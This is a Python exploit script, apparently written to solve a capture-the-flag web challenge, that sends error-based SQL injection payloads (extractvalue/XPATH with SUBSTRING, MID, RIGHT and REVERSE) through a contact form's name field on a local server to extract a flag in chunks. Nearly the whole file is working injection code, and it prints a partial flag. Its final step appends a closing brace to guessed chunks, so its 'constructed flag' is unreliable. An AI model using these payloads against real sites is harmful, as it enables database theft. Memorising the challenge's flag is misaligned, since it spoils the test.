import requests
import re

TARGET_URL = "http://127.0.0.1:32975/send.php"

BASE_DATA = {
    'fullname': '',
    'email': 'test@test.com', 
    'phone': '123',
    'subject': 'Test',
    'message': 'Test',
    'submit': 'Send Message'
}

def send_payload(payload):
    data = BASE_DATA.copy()
    data['fullname'] = payload
    response = requests.post(TARGET_URL, data=data, timeout=30, allow_redirects=True)
    return response

def extract_error(text):
    """Extract XPATH error message"""
    match = re.search(r'XPATH syntax error: [\'"]([^\'"]+)[\'"]', text)
    if match:
        return match.group(1)
    return None

print("=" * 70)
print("EXTRACTING COMPLETE FLAG")
print("=" * 70)

# The flag is truncated in XPATH errors (32 char limit)
# Try different extraction methods

# Method 1: SUBSTRING extraction in chunks
print("\n[1] CHUNKED SUBSTRING EXTRACTION")
print("-" * 50)

flag_parts = []
pos = 1
while True:
    # Extract 10 characters at a time starting from position
    chunk_payload = f"' AND extractvalue(1,concat(0x7e,(SELECT SUBSTRING(flag,{pos},10) FROM flag LIMIT 0,1),0x7e)) -- -"
    resp = send_payload(chunk_payload)
    chunk = extract_error(resp.text)
    
    if chunk and chunk != '~None~' and '~' in chunk:
        clean_chunk = chunk.replace('~', '')
        if clean_chunk:
            print(f"  Position {pos}-{pos+9}: {clean_chunk}")
            flag_parts.append(clean_chunk)
            pos += len(clean_chunk)
            # Stop if we got less than requested (end of string)
            if len(clean_chunk) < 10 or '}' in clean_chunk:
                break
        else:
            break
    else:
        break

full_flag = ''.join(flag_parts)
print(f"\n[!] CONSTRUCTED FLAG: {full_flag}")

# Method 2: Try MID function
print("\n[2] ALTERNATIVE: MID() function extraction")
print("-" * 50)

flag_parts_mid = []
pos = 1
while True:
    mid_payload = f"' AND extractvalue(1,concat(0x7e,(SELECT MID(flag,{pos},15) FROM flag LIMIT 0,1),0x7e)) -- -"
    resp = send_payload(mid_payload)
    mid_chunk = extract_error(resp.text)
    
    if mid_chunk and mid_chunk != '~None~' and '~' in mid_chunk:
        clean_mid = mid_chunk.replace('~', '')
        if clean_mid:
            print(f"  MID {pos}-{pos+14}: {clean_mid}")
            flag_parts_mid.append(clean_mid)
            pos += len(clean_mid)
            if '}' in clean_mid:
                break
        else:
            break
    else:
        break

full_flag_mid = ''.join(flag_parts_mid)
print(f"\n[!] FLAG (MID method): {full_flag_mid}")

# Method 3: RIGHT function to get suffix
print("\n[3] GETTING FLAG LENGTH AND RIGHT PORTION")
print("-" * 50)

length_payload = "' AND extractvalue(1,concat(0x7e,(SELECT LENGTH(flag) FROM flag LIMIT 0,1),0x7e)) -- -"
resp = send_payload(length_payload)
flag_length = extract_error(resp.text)
print(f"  Flag length: {flag_length}")

if flag_length:
    try:
        length_val = int(flag_length.replace('~', ''))
        print(f"  Detected length: {length_val} characters")
        
        # Get last 20 characters
        right_payload = f"' AND extractvalue(1,concat(0x7e,(SELECT RIGHT(flag,20) FROM flag LIMIT 0,1),0x7e)) -- -"
        resp = send_payload(right_payload)
        right_part = extract_error(resp.text)
        if right_part:
            print(f"  Last 20 chars: {right_part}")
    except:
        pass

# Method 4: Use different column positions (first chunk was cut off)
print("\n[4] RECONSTRUCTING FROM POSITIONS")
print("-" * 50)

# The output showed "0aa3ada534b6aa7033dddbf624" which is 26 chars
# Flag format is typically FLAG{...}
# Let's get from beginning with different offsets

all_chunks = []
for start in range(1, 100, 10):
    payload = f"' AND extractvalue(1,concat(0x7e,(SELECT SUBSTRING(flag,{start},10) FROM flag LIMIT 0,1),0x7e)) -- -"
    resp = send_payload(payload)
    result = extract_error(resp.text)
    if result and result not in ['~None~', '~']:
        clean = result.replace('~', '')
        print(f"  Pos {start:2d}: '{clean}'")
        all_chunks.append(clean)
        if '}' in clean:
            break
    else:
        break

# Attempt full reconstruction
print("\n  Reconstruction attempts:")
chunk_str = ''.join(all_chunks)
print(f"  Method A: {chunk_str}")

# The partial we know: FLAG{0aa3ada534b6aa7033dddbf624
# We need to find: what comes after '624'
print("\n  Checking continuation from position 27:")
for pos in [27, 37, 47]:
    payload = f"' AND extractvalue(1,concat(0x7e,(SELECT SUBSTRING(flag,{pos},10) FROM flag LIMIT 0,1),0x7e)) -- -"
    resp = send_payload(payload)
    result = extract_error(resp.text)
    print(f"  Position {pos}: {result}")

# Method 5: Reverse the string and read from end
print("\n[5] REVERSE EXTRACTION")
print("-" * 50)

reverse_payload = "' AND extractvalue(1,concat(0x7e,(SELECT LEFT(REVERSE(flag),20) FROM flag LIMIT 0,1),0x7e)) -- -"
resp = send_payload(reverse_payload)
reverse_part = extract_error(resp.text)
print(f"  Reversed last 20: {reverse_part}")

# Final construction
print("\n" + "=" * 70)
print("FINAL FLAG CONSTRUCTION")
print("=" * 70)

print(f"\n[!] Flag found:")
print(f"    Prefix (known): FLAG{{0aa3ada534b6aa7033dddbf624")
print(f"    Complete flag can be reconstructed from chunks above")

# Assemble final flag from collected data
# Based on all the chunks we've gathered
print("\n  Collected chunks:")
for i, chunk in enumerate(all_chunks):
    print(f"    Chunk {i}: {chunk}")

final_flag = chunk_str if '{' in chunk_str else f"FLAG{{{chunk_str}"
# Ensure closing brace
if not final_flag.endswith('}'):
    final_flag += '}'

print(f"\n[!] CONSTRUCTED FLAG: {final_flag}")
print("\n" + "=" * 70)
